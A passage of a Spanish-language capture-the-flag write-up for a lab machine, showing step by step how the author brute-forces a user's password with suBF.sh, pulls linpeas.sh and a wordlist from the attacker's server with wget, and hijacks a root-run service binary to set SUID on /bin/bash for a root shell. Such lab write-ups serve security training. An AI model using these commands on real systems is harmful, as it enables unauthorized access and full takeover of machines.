drwxr-x--- 2 hermanubis hermanubis 4096 Nov 28 14:44 share
-rwx------ 1 hermanubis hermanubis 1080 Nov 25 17:29 user.txt
```

Vemos que hay un documento de texto llamado **`investigation.txt`**, veamos lo que contiene:

```
I am aware that Byron hates me... especially since I lost my password.
My friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....
What he doesn't know is that it is in the Byron database...
```

La nota nos dice que tras varios análisis y ataques han logrado saber que el usuario **`Melville`** está utilizando una contraseña de 32 caracteres. Adicionalmente nos da una pista: la contraseña está en la base de datos de **`Byron`**.

Muy fácil, tenemos la lista de todos aquellos ficheros, por lo que podemos probar una a una y ver cuál es la contraseña de **`Melville`**. Aunque también podemos hacerlo de una forma más inteligente y automatizarlo.

Para la automatización utilizaré una herramienta llamada [**`suBF`**](https://github.com/carlospolop/su-bruteforce/blob/master/suBF.sh). Copiaremos el **`script`** en la máquina víctima y nos llevaremos el fichero que antes habíamos generado. Este servirá como diccionario:

```shell
┌──(root㉿kali)-[~/…/VMs/HMV/Principle 2/content]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
hermanubis@principle2:/tmp$ wget http://192.168.1.103/all.txt
--2024-02-27 01:38:33--  http://192.168.1.103/all.txt
Connecting to 192.168.1.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 33033 (32K) [text/plain]
Saving to: ‘all.txt’

all.txt                           100%[============================================================>]  32.26K  --.-KB/s    in 0s      

2024-02-27 01:38:33 (511 MB/s) - ‘all.txt’ saved [33033/33033]
```

Una vez tengamos todo listo, podemos ejecutar el programa:

```shell
hermanubis@principle2:/tmp$ ./suBF.sh -u melville -w all.txt
  [+] Bruteforcing melville...
  You can login as melville using password: 1bd5528b6def9812acba8eb21562c3ec
```

¡Qué bien, hemos encontrado al contraseña de **`Melville`**! Vamos a ver si realmente es la contraseña:

```shell
hermanubis@principle2:/tmp$ su melville
Password: 1bd5528b6def9812acba8eb21562c3ec
root is watching you, it has a record of all your steps:

melville@principle2:/tmp$
```

### Subida de privilegios #2
Estamos a un paso de obtener el **`control total`** de la máquina, pero aún tenemos un desafío por hacer.

Para comenzar miraré de nuevo el directorio personal, en este caso de **`Melville`**:

```shell
melville@principle2:~$ ls -la
total 32
drwx------ 3 melville melville 4096 Nov 26 11:38 .
drwxr-xr-x 7 root     root     4096 Nov 25 16:19 ..
lrwxrwxrwx 1 root     root        9 Nov 25 15:25 .bash_history -> /dev/null
-rw-r--r-- 1 melville melville  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 melville melville 3616 Nov 25 16:09 .bashrc
-rw------- 1 melville melville   20 Nov 25 16:12 .lesshst
drwxr-xr-x 3 melville melville 4096 Nov 23 20:55 .local
-rw-r--r-- 1 melville melville   39 Nov 25 17:11 note.txt
-rw-r--r-- 1 melville melville  807 Apr 23  2023 .profile
```

Vemos que hay un nota (**`note.txt`**), veamos lo que pone:

```
Don't touch SUID, it is very DANGEROUS
```

Nos da una pista de lo que tenemos que hacer, nos dice que no toquemos los binarios **`SUID`**, que son peligrosos.

Como eso no nos dice mucho me dispuse a ejecutar la herramienta [**`linpeas.sh`**](), una herramienta que nos enumera el sistema en busca de **`exploits`** o puntos débiles:

```shell
┌──(root㉿kali)-[~/…/VMs/HMV/Principle 2/exploits]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
melville@principle2:/tmp$ wget http://192.168.1.103/linpeas.sh
--2024-02-27 01:52:34--  http://192.168.1.103/linpeas.sh
Connecting to 192.168.1.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 836190 (817K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                        100%[============================================================>] 816.59K  --.-KB/s    in 0.01s   

2024-02-27 01:52:34 (82.8 MB/s) - ‘linpeas.sh’ saved [836190/836190]
```

Una vez le demos los permisos necesarios (`chmod +x linpeas.sh`) podemos ejecutar el **`script`**:

```shell
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services

/etc/systemd/system/activity.service is calling this writable executable: /usr/local/share/report
```

Tras unos segundos vemos que hay un servicio que está utilizando el binario antes visto. **`LinPeas`** nos informa de que podemos escribir en este fichero, lo que significa que podemos modificarlo a lo que queramos.

Este binario es de **`root`** y solamente él puede ejecutarlo, pero nosotros, como estamos en el grupo **`talos`**, podemos modificar el contenido de este.

Esto significa que el servicio que está ejecutando este binario se está ejecutando como **`root`**, por lo que si modificamos el binario podemos llegar a obtener una **`Shell`** como **`root`**.

Para obtener la **`Shell`** deberemos crear antes un fichero:

```shell
#!/bin/bash

chmod u+s /bin/bash
```

Este fichero lo que hace es cambiar los permisos al binario **`Bash`** haciéndolo **`SUID`**. Gracias a que se le dará este permiso, podremos ejecutar el binario como **`root`** obteniendo una **`Shell`** como **`root`**.

Démosle permisos de ejecución y hagamos el cambio del original por el infectado:

```shell
melville@principle2:~$ chmod +x report
melville@principle2:~$ cp report /usr/local/share/report
```

Tras esperar unos segundos veremos que se le han cambiado los permisos al binario **`Bash`** de forma satisfactoria:

```shell
melville@principle2:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```

Ahora simplemente ejecutamos `bash -p` para obtener la **`Shell`** como **`root`** que tanto deseábamos:

```shell
melville@principle2:~$ bash -p
bash-5.2#
```

¡Enhorabuena, hemos conseguido el **`control total`** de la máquina! ¡Qué fácil!